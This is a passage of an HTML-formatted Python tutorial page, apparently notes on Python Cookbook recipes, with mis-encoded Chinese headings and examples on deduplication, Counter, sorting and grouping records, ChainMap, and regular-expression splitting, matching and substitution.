class="number">2</span></span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.keys() &amp; b.keys()</span><br><span class="line">&#123;<span class="string">'y'</span>, <span class="string">'x'</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.items() &amp; b.items()</span><br><span class="line">&#123;(<span class="string">'y'</span>, <span class="number">2</span>)&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ é™¤åºåˆ—ç›¸åŒå…ƒç´ å¹¶ä¿æŒé¡ºåº"><a href="#åˆ é™¤åºåˆ—ç›¸åŒå…ƒç´ å¹¶ä¿æŒé¡ºåº" class="headerlink" title="åˆ é™¤åºåˆ—ç›¸åŒå…ƒç´ å¹¶ä¿æŒé¡ºåº"></a>åˆ é™¤åºåˆ—ç›¸åŒå…ƒç´ å¹¶ä¿æŒé¡ºåº</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dedupe</span><span class="params">(items)</span>:</span></span><br><span class="line">    seen = set()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> seen:</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line">            seen.add(item)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(dedupe(a))</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dedupe</span><span class="params">(items, key=None)</span>:</span></span><br><span class="line">    seen = set()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        val = item <span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> key(item)</span><br><span class="line">        <span class="keyword">if</span> val <span class="keyword">not</span> <span class="keyword">in</span> seen:</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line">            seen.add(val)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [ &#123;<span class="string">'x'</span>:<span class="number">1</span>, <span class="string">'y'</span>:<span class="number">2</span>&#125;, &#123;<span class="string">'x'</span>:<span class="number">1</span>, <span class="string">'y'</span>:<span class="number">3</span>&#125;, &#123;<span class="string">'x'</span>:<span class="number">1</span>, <span class="string">'y'</span>:<span class="number">2</span>&#125;, &#123;<span class="string">'x'</span>:<span class="number">2</span>, <span class="string">'y'</span>:<span class="number">4</span>&#125;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(dedupe(a, key=<span class="keyword">lambda</span> d: (d[<span class="string">'x'</span>],d[<span class="string">'y'</span>])))</span><br><span class="line">[&#123;<span class="string">'x'</span>: <span class="number">1</span>, <span class="string">'y'</span>: <span class="number">2</span>&#125;, &#123;<span class="string">'x'</span>: <span class="number">1</span>, <span class="string">'y'</span>: <span class="number">3</span>&#125;, &#123;<span class="string">'x'</span>: <span class="number">2</span>, <span class="string">'y'</span>: <span class="number">4</span>&#125;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(dedupe(a, key=<span class="keyword">lambda</span> d: d[<span class="string">'x'</span>]))</span><br><span class="line">[&#123;<span class="string">'x'</span>: <span class="number">1</span>, <span class="string">'y'</span>: <span class="number">2</span>&#125;, &#123;<span class="string">'x'</span>: <span class="number">2</span>, <span class="string">'y'</span>: <span class="number">4</span>&#125;]</span><br></pre></td></tr></table></figure><h4 id="åºåˆ—ä¸­å‡ºç°æ¬¡æ•°æœ€å¤šçš„å…ƒç´ "><a href="#åºåˆ—ä¸­å‡ºç°æ¬¡æ•°æœ€å¤šçš„å…ƒç´ " class="headerlink" title="åºåˆ—ä¸­å‡ºç°æ¬¡æ•°æœ€å¤šçš„å…ƒç´ "></a>åºåˆ—ä¸­å‡ºç°æ¬¡æ•°æœ€å¤šçš„å…ƒç´ </h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>words = [</span><br><span class="line"><span class="meta">... </span>    <span class="string">'look'</span>, <span class="string">'into'</span>, <span class="string">'my'</span>, <span class="string">'eyes'</span>, <span class="string">'look'</span>, <span class="string">'into'</span>, <span class="string">'my'</span>, <span class="string">'eyes'</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'the'</span>, <span class="string">'eyes'</span>, <span class="string">'the'</span>, <span class="string">'eyes'</span>, <span class="string">'the'</span>, <span class="string">'eyes'</span>, <span class="string">'not'</span>, <span class="string">'around'</span>, <span class="string">'the'</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'eyes'</span>, <span class="string">"don't"</span>, <span class="string">'look'</span>, <span class="string">'around'</span>, <span class="string">'the'</span>, <span class="string">'eyes'</span>, <span class="string">'look'</span>, <span class="string">'into'</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'my'</span>, <span class="string">'eyes'</span>, <span class="string">"you're"</span>, <span class="string">'under'</span></span><br><span class="line"><span class="meta">... </span>]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>word_counts = Counter(words)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>top_three = word_counts.most_common(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>top_three</span><br><span class="line">[(<span class="string">'eyes'</span>, <span class="number">8</span>), (<span class="string">'the'</span>, <span class="number">5</span>), (<span class="string">'look'</span>, <span class="number">4</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>word_counts[<span class="string">'not'</span>]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>word_counts[<span class="string">'eyes'</span>]</span><br><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure><h4 id="é€šè¿‡æŸä¸ªå…³é”®å­—æ’åºå­—å…¸åˆ—è¡¨"><a href="#é€šè¿‡æŸä¸ªå…³é”®å­—æ’åºå­—å…¸åˆ—è¡¨" class="headerlink" title="é€šè¿‡æŸä¸ªå…³é”®å­—æ’åºå­—å…¸åˆ—è¡¨"></a>é€šè¿‡æŸä¸ªå…³é”®å­—æ’åºå­—å…¸åˆ—è¡¨</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows = [</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'fname'</span>: <span class="string">'Brian'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1003</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'fname'</span>: <span class="string">'David'</span>, <span class="string">'lname'</span>: <span class="string">'Beazley'</span>, <span class="string">'uid'</span>: <span class="number">1002</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'fname'</span>: <span class="string">'John'</span>, <span class="string">'lname'</span>: <span class="string">'Cleese'</span>, <span class="string">'uid'</span>: <span class="number">1001</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'fname'</span>: <span class="string">'Big'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1004</span>&#125;</span><br><span class="line"><span class="meta">... </span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows_by_fname = sorted(rows,key=itemgetter(<span class="string">'fname'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows_by_fname</span><br><span class="line">[&#123;<span class="string">'fname'</span>: <span class="string">'Big'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1004</span>&#125;, &#123;<span class="string">'fname'</span>: <span class="string">'Brian'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1003</span>&#125;, &#123;<span class="string">'fname'</span>: <span class="string">'David'</span>, <span class="string">'lname'</span>: <span class="string">'Beazley'</span>, <span class="string">'uid'</span>: <span class="number">1002</span>&#125;, &#123;<span class="string">'fname'</span>: <span class="string">'John'</span>, <span class="string">'lname'</span>: <span class="string">'Cleese'</span>, <span class="string">'uid'</span>: <span class="number">1001</span>&#125;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows_by_uid = sorted(rows,key=itemgetter(<span class="string">'uid'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows_by_uid</span><br><span class="line">[&#123;<span class="string">'fname'</span>: <span class="string">'John'</span>, <span class="string">'lname'</span>: <span class="string">'Cleese'</span>, <span class="string">'uid'</span>: <span class="number">1001</span>&#125;, &#123;<span class="string">'fname'</span>: <span class="string">'David'</span>, <span class="string">'lname'</span>: <span class="string">'Beazley'</span>, <span class="string">'uid'</span>: <span class="number">1002</span>&#125;, &#123;<span class="string">'fname'</span>: <span class="string">'Brian'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1003</span>&#125;, &#123;<span class="string">'fname'</span>: <span class="string">'Big'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1004</span>&#125;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>min(rows,key=itemgetter(<span class="string">'uid'</span>))</span><br><span class="line">&#123;<span class="string">'fname'</span>: <span class="string">'John'</span>, <span class="string">'lname'</span>: <span class="string">'Cleese'</span>, <span class="string">'uid'</span>: <span class="number">1001</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>max(rows,key=itemgetter(<span class="string">'uid'</span>))</span><br><span class="line">&#123;<span class="string">'fname'</span>: <span class="string">'Big'</span>, <span class="string">'lname'</span>: <span class="string">'Jones'</span>, <span class="string">'uid'</span>: <span class="number">1004</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="é€šè¿‡æŸä¸ªå­—æ®µå°†è®°å½•åˆ†ç»„"><a href="#é€šè¿‡æŸä¸ªå­—æ®µå°†è®°å½•åˆ†ç»„" class="headerlink" title="é€šè¿‡æŸä¸ªå­—æ®µå°†è®°å½•åˆ†ç»„"></a>é€šè¿‡æŸä¸ªå­—æ®µå°†è®°å½•åˆ†ç»„</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows = [</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'5412 N CLARK'</span>, <span class="string">'date'</span>: <span class="string">'07/01/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'5148 N CLARK'</span>, <span class="string">'date'</span>: <span class="string">'07/04/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'5800 E 58TH'</span>, <span class="string">'date'</span>: <span class="string">'07/02/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'2122 N CLARK'</span>, <span class="string">'date'</span>: <span class="string">'07/03/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'5645 N RAVENSWOOD'</span>, <span class="string">'date'</span>: <span class="string">'07/02/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'1060 W ADDISON'</span>, <span class="string">'date'</span>: <span class="string">'07/02/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'4801 N BROADWAY'</span>, <span class="string">'date'</span>: <span class="string">'07/01/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>    &#123;<span class="string">'address'</span>: <span class="string">'1039 W GRANVILLE'</span>, <span class="string">'date'</span>: <span class="string">'07/04/2012'</span>&#125;,</span><br><span class="line"><span class="meta">... </span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> groupby</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rows.sort(key=itemgetter(<span class="string">'date'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> date,items <span class="keyword">in</span> groupby(rows,key=itemgetter(<span class="string">'date'</span>)):</span><br><span class="line"><span class="meta">... </span>    print(date)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">for</span> i <span class="keyword">in</span> items:</span><br><span class="line"><span class="meta">... </span>            print(<span class="string">' '</span>,i)</span><br><span class="line">...</span><br><span class="line"><span class="number">07</span>/<span class="number">01</span>/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'5412 N CLARK'</span>, <span class="string">'date'</span>: <span class="string">'07/01/2012'</span>&#125;</span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'4801 N BROADWAY'</span>, <span class="string">'date'</span>: <span class="string">'07/01/2012'</span>&#125;</span><br><span class="line"><span class="number">07</span>/<span class="number">02</span>/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'5800 E 58TH'</span>, <span class="string">'date'</span>: <span class="string">'07/02/2012'</span>&#125;</span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'5645 N RAVENSWOOD'</span>, <span class="string">'date'</span>: <span class="string">'07/02/2012'</span>&#125;</span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'1060 W ADDISON'</span>, <span class="string">'date'</span>: <span class="string">'07/02/2012'</span>&#125;</span><br><span class="line"><span class="number">07</span>/<span class="number">03</span>/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'2122 N CLARK'</span>, <span class="string">'date'</span>: <span class="string">'07/03/2012'</span>&#125;</span><br><span class="line"><span class="number">07</span>/<span class="number">04</span>/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'5148 N CLARK'</span>, <span class="string">'date'</span>: <span class="string">'07/04/2012'</span>&#125;</span><br><span class="line">  &#123;<span class="string">'address'</span>: <span class="string">'1039 W GRANVILLE'</span>, <span class="string">'date'</span>: <span class="string">'07/04/2012'</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="è¿‡æ»¤åˆ—è¡¨å…ƒç´ "><a href="#è¿‡æ»¤åˆ—è¡¨å…ƒç´ " class="headerlink" title="è¿‡æ»¤åˆ—è¡¨å…ƒç´ "></a>è¿‡æ»¤åˆ—è¡¨å…ƒç´ </h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">values = [<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'-3'</span>, <span class="string">'-'</span>, <span class="string">'4'</span>, <span class="string">'N/A'</span>, <span class="string">'5'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_int</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = int(val)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">ivals = list(filter(is_int, values))</span><br><span class="line">print(ivals)</span><br><span class="line"><span class="comment"># Outputs ['1', '2', '-3', '4', '5']</span></span><br></pre></td></tr></table></figure><h4 id="ä»å­—å…¸ä¸­æå–å­é›†"><a href="#ä»å­—å…¸ä¸­æå–å­é›†" class="headerlink" title="ä»å­—å…¸ä¸­æå–å­é›†"></a>ä»å­—å…¸ä¸­æå–å­é›†</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>prices = &#123;</span><br><span class="line"><span class="meta">... </span>    <span class="string">'ACME'</span>: <span class="number">45.23</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'AAPL'</span>: <span class="number">612.78</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'IBM'</span>: <span class="number">205.55</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'HPQ'</span>: <span class="number">37.20</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'FB'</span>: <span class="number">10.75</span></span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1 = dict((key, value) <span class="keyword">for</span> key, value <span class="keyword">in</span> prices.items() <span class="keyword">if</span> value &gt; <span class="number">200</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1</span><br><span class="line">&#123;<span class="string">'AAPL'</span>: <span class="number">612.78</span>, <span class="string">'IBM'</span>: <span class="number">205.55</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆå¹¶å¤šä¸ªå­—å…¸æˆ–æ˜ å°„"><a href="#åˆå¹¶å¤šä¸ªå­—å…¸æˆ–æ˜ å°„" class="headerlink" title="åˆå¹¶å¤šä¸ªå­—å…¸æˆ–æ˜ å°„"></a>åˆå¹¶å¤šä¸ªå­—å…¸æˆ–æ˜ å°„</h4><p>å‡è®¾æœ‰å¦‚ä¸‹ä¸¤ä¸ªå­—å…¸</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;<span class="string">'x'</span>: <span class="number">1</span>, <span class="string">'z'</span>: <span class="number">3</span> &#125;</span><br><span class="line">b = &#123;<span class="string">'y'</span>: <span class="number">2</span>, <span class="string">'z'</span>: <span class="number">4</span> &#125;</span><br></pre></td></tr></table></figure><p>å‡è®¾å¿…é¡»åœ¨ä¸¤ä¸ªå­—å…¸ä¸­æ‰§è¡ŒæŸ¥æ‰¾æ“ä½œï¼ˆæ¯”å¦‚å…ˆä»aä¸­æ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°å†åœ¨bä¸­æ‰¾ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> ChainMap</span><br><span class="line">c = ChainMap(a,b)</span><br><span class="line">print(c[<span class="string">'x'</span>]) <span class="comment"># Outputs 1 (from a)</span></span><br><span class="line">print(c[<span class="string">'y'</span>]) <span class="comment"># Outputs 2 (from b)</span></span><br><span class="line">print(c[<span class="string">'z'</span>]) <span class="comment"># Outputs 3 (from a)</span></span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²å’Œæ–‡æœ¬"><a href="#å­—ç¬¦ä¸²å’Œæ–‡æœ¬" class="headerlink" title="å­—ç¬¦ä¸²å’Œæ–‡æœ¬"></a>å­—ç¬¦ä¸²å’Œæ–‡æœ¬</h3><h4 id="ä½¿ç”¨å¤šä¸ªç•Œå®šç¬¦åˆ†å‰²å­—ç¬¦ä¸²"><a href="#ä½¿ç”¨å¤šä¸ªç•Œå®šç¬¦åˆ†å‰²å­—ç¬¦ä¸²" class="headerlink" title="ä½¿ç”¨å¤šä¸ªç•Œå®šç¬¦åˆ†å‰²å­—ç¬¦ä¸²"></a>ä½¿ç”¨å¤šä¸ªç•Œå®šç¬¦åˆ†å‰²å­—ç¬¦ä¸²</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>line = <span class="string">'asdf fjdk; afed, fjek,asdf, foo'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">r'[;,\s]\s*'</span>,line)</span><br><span class="line">[<span class="string">'asdf'</span>, <span class="string">'fjdk'</span>, <span class="string">'afed'</span>, <span class="string">'fjek'</span>, <span class="string">'asdf'</span>, <span class="string">'foo'</span>]</span><br></pre></td></tr></table></figure><p>å‡½æ•°<code>re.split()</code>æ˜¯éå¸¸å®ç”¨çš„ï¼Œå› ä¸ºå®ƒå…è®¸ä½ ä¸ºåˆ†éš”ç¬¦æŒ‡å®šå¤šä¸ªæ­£åˆ™æ¨¡å¼ã€‚ æ¯”å¦‚ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œåˆ†éš”ç¬¦å¯ä»¥æ˜¯é€—å·ï¼Œåˆ†å·æˆ–è€…æ˜¯ç©ºæ ¼ï¼Œå¹¶ä¸”åé¢ç´§è·Ÿç€ä»»æ„ä¸ªçš„ç©ºæ ¼ã€‚ åªè¦è¿™ä¸ªæ¨¡å¼è¢«æ‰¾åˆ°ï¼Œé‚£ä¹ˆåŒ¹é…çš„åˆ†éš”ç¬¦ä¸¤è¾¹çš„å®ä½“éƒ½ä¼šè¢«å½“æˆæ˜¯ç»“æœä¸­çš„å…ƒç´ è¿”å›ã€‚ è¿”å›ç»“æœä¸ºä¸€ä¸ªå­—æ®µåˆ—è¡¨ï¼Œè¿™ä¸ªè·Ÿ<code>str.split()</code>è¿”å›å€¼ç±»å‹æ˜¯ä¸€æ ·çš„ã€‚</p><h4 id="ç”¨shellé€šé…ç¬¦åŒ¹é…å­—ç¬¦ä¸²"><a href="#ç”¨shellé€šé…ç¬¦åŒ¹é…å­—ç¬¦ä¸²" class="headerlink" title="ç”¨shellé€šé…ç¬¦åŒ¹é…å­—ç¬¦ä¸²"></a>ç”¨shellé€šé…ç¬¦åŒ¹é…å­—ç¬¦ä¸²</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> fnmatch <span class="keyword">import</span> fnmatch,fnmatchcase</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fnmatch(<span class="string">'foo.txt'</span>,<span class="string">'*.txt'</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fnmatch(<span class="string">'foo.txt'</span>,<span class="string">'*.TXT'</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fnmatchcase(<span class="string">'foo.txt'</span>,<span class="string">'*.TXT'</span>)</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²åŒ¹é…å’Œæœç´¢"><a href="#å­—ç¬¦ä¸²åŒ¹é…å’Œæœç´¢" class="headerlink" title="å­—ç¬¦ä¸²åŒ¹é…å’Œæœç´¢"></a>å­—ç¬¦ä¸²åŒ¹é…å’Œæœç´¢</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>datepat = re.compile(<span class="string">r'\d+/\d+/\d+'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">'today is 2023/10/7.tomorrow is 2023/10/8.'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>datepat.findall(text)</span><br><span class="line">[<span class="string">'2023/10/7'</span>, <span class="string">'2023/10/8'</span>]</span><br></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²æœç´¢å’Œæ›¿æ¢"><a href="#å­—ç¬¦ä¸²æœç´¢å’Œæ›¿æ¢" class="headerlink" title="å­—ç¬¦ä¸²æœç´¢å’Œæ›¿æ¢"></a>å­—ç¬¦ä¸²æœç´¢å’Œæ›¿æ¢</h4><p>å¯¹äºç®€å•çš„æœç´¢ï¼Œç›´æ¥ä½¿ç”¨<code>str.replace()</code>æ–¹æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">'this is a test.'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.replace(<span class="string">'this'</span>,<span class="string">'that'</span>)</span><br><span class="line"><span class="string">'that is a test.'</span></span><br></pre></td></tr></table></figure><p>å¯¹äºå¤æ‚çš„æ¨¡å¼ï¼Œå¯ä»¥ä½¿ç”¨<code>re</code>æ¨¡å—ä¸­çš„<code>sub()</code>å‡½æ•°ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">'today is 2023/10/7.tomorrow is 2023/10/8.'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.sub(<span class="string">r'(\d+)/(\d+)/(\d+)'</span>, <span class="string">r'\1-\2-\3'</span>, text)</span><br><span class="line"><span class="string">'today is 2023-10-7.tomorrow is 2023-10-8.'</span></span><br></pre></td></tr></table></figure><h4 id="æœ€çŸ­åŒ¹é…æ¨¡å¼"><a href="#æœ€çŸ­åŒ¹é…æ¨¡å¼" class="headerlink" title="æœ€çŸ­åŒ¹é…æ¨¡å¼"></a>æœ€çŸ­åŒ¹é…æ¨¡å¼</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_pat = re.compile(<span class="string">r'"(.*)"'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text1 = <span class="string">'Computer says "no."'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_pat.findall(text1)</span><br><span class="line">[<span class="string">'no.'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text2 = <span class="string">'Computer says "no." phone says 